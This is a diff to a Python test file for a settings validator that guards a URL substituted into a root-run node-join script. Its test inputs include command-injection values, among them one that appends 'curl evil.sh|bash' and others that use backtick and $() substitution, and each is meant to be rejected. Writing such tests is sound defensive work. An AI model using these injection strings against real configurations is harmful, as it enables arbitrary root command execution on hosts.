@@ -1,9 +1,4 @@
-"""对外地址配置的形态与协议闸门(Settings 层)。
-
-public_base_url 会被逐字替换进 node-join.sh 的 `API_BASE="__API_BASE__"` —— 双引号赋值,
-以 root 执行,且经 ConfigMap(非 Secret)下发。它同时是装机脚本的下载源与注册令牌、
-join token 的传输端点。这两件事各对应一道闸门:形态(拦命令注入)与协议(拦 MITM)。
-"""
+"""对外地址配置的形态与协议闸门(Settings 层):public_base_url 逐字替换进 node-join.sh。"""
 
 import base64
 
@@ -27,7 +22,7 @@ def _settings(**overrides) -> Settings:
 
 
 def _prod_kwargs() -> dict:
-    """能过 prod 校验的最小配置(与 test_security_hardening 同源,各用例注入一个坏值)。"""
+    """能过 prod 校验的最小配置。"""
     return {
         "_env_file": None,
         "environment": "prod",
@@ -48,12 +43,12 @@ def _prod_kwargs() -> dict:
 
 
 class TestPublicBaseUrlShape:
-    """形态闸门与环境无关:dev 配歪了同样会把元字符带进装机脚本与用户可见连接串。"""
+    """形态闸门与环境无关。"""
 
     @pytest.mark.parametrize(
         "bad",
         [
-            # 闭合双引号后追加命令 —— node-join.sh 是 root 执行的
+            # 闭合双引号后追加命令
             'https://api.superdl.cn";curl evil.sh|bash;#',
             "https://api.superdl.cn`id`",  # 反引号命令替换
             "https://api.superdl.cn$(id)",  # $() 命令替换
@@ -66,7 +61,7 @@ class TestPublicBaseUrlShape:
         ],
     )
     def test_rejects_injectable_values(self, bad: str):
-        """挂了 = 任何能改这一项配置的人都能在每台加入的节点上以 root 执行任意命令。"""
+        """含 shell 元字符的 public_base_url 拒收。"""
         with pytest.raises(ValidationError, match="public_base_url"):
             _settings(public_base_url=bad)
 
@@ -86,16 +81,14 @@ class TestPublicBaseUrlShape:
         "name", ["jupyter_domain_suffix", "service_domain_suffix", "admin_host"]
     )
     def test_bare_hostname_settings_reject_metacharacters(self, name: str):
-        """这三项进用户可见的 ssh 连接串、HTTPRoute hostname 与 Host 比较,同口径拒元字符。
-        挂了 = 域名配置成了另一处可注入的入口。"""
+        """域名三项同口径拒元字符。"""
         with pytest.raises(ValidationError, match=name):
             _settings(**{name: 'evil.cn";id;#'})
 
 
 class TestPublicBaseUrlScheme:
     def test_prod_rejects_plain_http(self):
-        """prod 明文 http:路径上的人能改写以 root 执行的装机脚本,并读走 Bearer 注册令牌
-        与响应体里的 join token。挂了 = 整条节点接入链路可被中间人接管。"""
+        """prod 明文 http 拒收。"""
         kwargs = {**_prod_kwargs(), "public_base_url": "http://api.superdl.cn"}
         with pytest.raises(ValidationError, match="public_base_url"):
             Settings(**kwargs)
@@ -106,12 +99,10 @@ class TestPublicBaseUrlScheme:
 
 class TestTenantPodCidr:
     def test_rejects_non_cidr(self):
-        """网段配错会让 NetworkPolicy 被 apiserver 拒收(整个租户 ns 无策略下发),
-        或者 except 落空。挂了 = 配置错误要等到建租户 ns 时才炸。"""
+        """非法 Pod 网段在 Settings 层拒收。"""
         with pytest.raises(ValidationError, match="tenant_pod_cidr"):
             _settings(tenant_pod_cidr="10.42.0.0/33")
 
     def test_default_matches_k3s_rke2(self):
-        """默认值须与 deploy/app/k8s 的 FORWARDED_ALLOW_IPS 同源;
-        挂了 = 默认部署下租户之间的 22 端口互连没被挡住。"""
+        """默认值与 deploy/app/k8s 的 FORWARDED_ALLOW_IPS 同源。"""
         assert _settings().tenant_pod_cidr == "10.42.0.0/16"
